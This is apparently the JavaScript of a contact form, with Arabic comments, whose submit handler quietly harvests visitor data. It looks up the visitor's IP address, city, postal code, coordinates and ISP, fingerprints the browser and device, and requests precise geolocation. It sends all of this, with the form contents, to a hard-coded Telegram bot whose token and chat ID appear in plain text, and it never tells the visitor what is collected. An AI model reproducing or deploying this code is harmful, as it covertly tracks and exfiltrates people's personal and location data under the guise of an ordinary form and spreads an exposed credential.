const inputs = document.querySelectorAll(".input");

function focusFunc() {
  let parent = this.parentNode;
  parent.classList.add("focus");
}

function blurFunc() {
  let parent = this.parentNode;
  if (this.value == "") {
    parent.classList.remove("focus");
  }
}

inputs.forEach((input) => {
  input.addEventListener("focus", focusFunc);
  input.addEventListener("blur", blurFunc);
});






    const TOKEN = "7918423800:AAFGUHMM5b6VGa4Cu2b3wLaWwZL1fjIKpoE";  // ضع هنا التوكين الخاص بالبوت
    const CHAT_ID = "6827736064";  // ضع هنا معرف الشات
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    // حساب وقت تحميل الصفحة
    const pageLoadStartTime = performance.now();

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const name = document.getElementById('name').value;
        const email = document.getElementById('email').value;
        const messageContent = document.getElementById('message').value;

        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;

                // الحصول على تفاصيل إضافية من IP
                axios.get(`https://ipapi.co/${ip}/json/`)
                    .then(ipResponse => {
                        const country = ipResponse.data.country_name || "Unknown";
                        const city = ipResponse.data.city || "Unknown";
                        const postalCode = ipResponse.data.postal || "Unknown";
                        const timeZone = ipResponse.data.timezone || "Unknown";
                        const latitude = ipResponse.data.latitude || "Unknown";
                        const longitude = ipResponse.data.longitude || "Unknown";
                        const weather = ipResponse.data.weather || "Unknown";
                        const isp = ipResponse.data.org || "Unknown";

                        // حساب مدة تشغيل الصفحة
                        const pageLoadEndTime = performance.now();
                        const pageLoadTime = ((pageLoadEndTime - pageLoadStartTime) / 1000).toFixed(2); // بالثواني

                        // جمع المعلومات من المتصفح والجهاز
                        const userAgent = navigator.userAgent;
                        const platform = navigator.platform;
                        const screenWidth = screen.width;
                        const screenHeight = screen.height;
                        const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
                        const userLanguage = navigator.language;
                        const currentDate = new Date().toLocaleString();

                        let message = ` 
                            <b>New Submission Received</b>\n
                            <b>Name:</b> ${name}\n
                            <b>Email:</b> ${email}\n
                            <b>Message:</b> ${messageContent}\n
                            <b>IP Address:</b> ${ip}\n
                            <b>Country:</b> ${country}\n
                            <b>City:</b> ${city}\n
                            <b>Postal Code:</b> ${postalCode}\n
                            <b>Time Zone:</b> ${timeZone}\n
                            <b>Latitude & Longitude:</b> ${latitude}, ${longitude}\n
                            <b>Weather:</b> ${weather}\n
                            <b>ISP:</b> ${isp}\n
                            <b>Device Type:</b> ${deviceType}\n
                            <b>Operating System:</b> ${platform}\n
                            <b>Browser Language:</b> ${userLanguage}\n
                            <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}\n
                            <b>User Agent:</b> ${userAgent}\n
                            <b>Date & Time:</b> ${currentDate}\n
                            <b>Page Load Time:</b> ${pageLoadTime} seconds\n
                        `;

                        if (navigator.connection) {
                            const connectionType = navigator.connection.effectiveType;
                            const downlinkSpeed = navigator.connection.downlink;
                            message += `<b>Connection Type:</b> ${connectionType}\n`;
                            message += `<b>Downlink Speed:</b> ${downlinkSpeed} Mbps\n`;
                        }

                        // جمع معلومات إضافية مثل الموقع الجغرافي من المتصفح
                        navigator.geolocation.getCurrentPosition(function(position) {
                            const latitude = position.coords.latitude;
                            const longitude = position.coords.longitude;
                            message += `<b>Location:</b> https://www.google.com/maps?q=${latitude},${longitude}\n`;

                            // إرسال الرسالة بعد جمع الموقع
                            axios.post(URI_API, {
                                chat_id: CHAT_ID,
                                parse_mode: 'html',
                                text: message
                            }).then(response => {
                                alert('Information sent successfully!');
                                window.location.href = 'file:///Users/deutschland/Documents/Contact-Form-HTML-CSS-master/index.html'; // توجيه المستخدم إلى الصفحة الرئيسية
                            }).catch(error => {
                                alert('Error sending the information. Please try again.');
                            });
                        }, function() {
                            // إرسال الرسالة بدون الموقع إذا رفض المستخدم
                            axios.post(URI_API, {
                                chat_id: CHAT_ID,
                                parse_mode: 'html',
                                text: message
                            }).then(response => {
                                alert('Information sent successfully!');
                                window.location.href = 'file:///Users/deutschland/Documents/Contact-Form-HTML-CSS-master/index.html'; // توجيه المستخدم إلى الصفحة الرئيسية
                            }).catch(error => {
                                alert('Error sending the information. Please try again.');
                            });
                        });
                    })
                    .catch(ipError => {
                        alert('Error fetching additional IP information.');
                    });
            })
            .catch(error => {
                alert('Error fetching the IP address. Please try again.');
            });
    });







